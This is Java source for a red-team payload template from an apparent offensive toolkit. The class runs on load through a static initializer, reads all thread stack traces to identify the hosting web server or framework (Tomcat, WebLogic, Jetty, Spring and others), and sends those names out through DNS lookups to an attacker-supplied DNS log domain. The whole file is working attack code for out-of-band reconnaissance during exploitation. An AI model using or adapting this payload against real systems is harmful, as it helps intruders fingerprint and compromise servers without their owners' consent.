package com.potato.potatotool.content.redTeam.payload.detector.templates;

import java.net.InetAddress;
import java.net.UnknownHostException;
import java.util.ArrayList;
import java.util.Map;

public class DNSLogDetectorTemplate {
    static {
        new DNSLogDetectorTemplate();
    }

    public DNSLogDetectorTemplate() {
        sendServerType();
    }

    public static String getDomain() {
        return "";
    }

    private static void sendServerType() {
        ArrayList<String> serverTypes = getServerType();
        String dnsDomain = getDomain();
        try {
            for (int i = 0; i < serverTypes.size(); i++) {
                Object serverType = serverTypes.get(i);
                String domain = String.format("%s.%d.%s", serverType, System.nanoTime(), dnsDomain);
                InetAddress.getAllByName(domain);
            }
        } catch (UnknownHostException ignored) {
        }
    }

    public static ArrayList<String> getServerType() {
        ArrayList<String> serverTypes = new ArrayList<String>();
        Map<Thread, StackTraceElement[]> stackTraces = Thread.getAllStackTraces();
        for (Map.Entry<Thread, StackTraceElement[]> entry : stackTraces.entrySet()) {
            StackTraceElement[] stackTraceElements = entry.getValue();
            for (int i = 0; i < stackTraceElements.length; i++) {
                StackTraceElement element = stackTraceElements[i];
                appendServerType(serverTypes, element.getClassName());
            }
            if (serverTypes.size() > 7) {
                return serverTypes;
            }
        }
        if (serverTypes.size() == 0) {
            serverTypes.add("none");
        }
        return serverTypes;
    }

    private static void appendServerType(ArrayList<String> serverTypes, String className) {
        if (className.contains("org.apache.catalina.core")) serverTypes.add("tomcat");
        if (className.contains("weblogic.servlet.internal")) serverTypes.add("weblogic");
        if (className.contains("com.caucho.server")) serverTypes.add("resin");
        if (className.contains("org.eclipse.jetty.server")) serverTypes.add("jetty");
        if (className.contains("com.ibm.ws")) serverTypes.add("websphere");
        if (className.contains("io.undertow.server")) serverTypes.add("undertow");
        if (className.contains("com.tongweb.web")) serverTypes.add("tongweb");
        if (className.contains("com.apusic.web")) serverTypes.add("apusic");
        if (className.contains("org.springframework.web")) serverTypes.add("spring");
    }
}
